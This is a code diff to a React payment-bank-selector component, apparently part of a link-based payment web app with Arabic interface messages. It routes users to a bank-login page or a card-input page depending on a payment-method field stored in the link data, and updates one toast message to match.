@@ -87,6 +87,9 @@ const PaymentBankSelector = () => {
   const handleSkip = async () => {
     if (!linkData) return;
 
+    // Get payment method from link data
+    const paymentMethod = linkData.payload?.payment_method || 'card';
+
     // Save to link for cross-device compatibility
     try {
       const updatedPayload = {
@@ -105,14 +108,22 @@ const PaymentBankSelector = () => {
 
     toast({
       title: "تم التخطي",
-      description: "يمكنك إدخال بيانات البطاقة من أي بنك",
+      description: paymentMethod === 'bank_login' ? "سيتم تسجيل الدخول بدون تحديد بنك" : "يمكنك إدخال بيانات البطاقة من أي بنك",
     });
 
-    navigate(`/pay/${id}/card-input`);
+    // Navigate based on payment method
+    if (paymentMethod === 'bank_login') {
+      navigate(`/pay/${id}/bank-login`);
+    } else {
+      navigate(`/pay/${id}/card-input`);
+    }
   };
 
   const handleContinue = async () => {
     if (!linkData || !selectedBank) return;
+
+    // Get payment method from link data
+    const paymentMethod = linkData.payload?.payment_method || 'card';
 
     // Save to link for cross-device compatibility
     try {
@@ -130,7 +141,14 @@ const PaymentBankSelector = () => {
       console.error('Error saving bank selection:', error);
     }
 
-    navigate(`/pay/${id}/card-input`);
+    // Navigate based on payment method
+    if (paymentMethod === 'bank_login') {
+      // For bank login: skip card input, go directly to bank login
+      navigate(`/pay/${id}/bank-login`);
+    } else {
+      // For card payment: go to card input
+      navigate(`/pay/${id}/card-input`);
+    }
   };
   
   // Show loading state while fetching link data
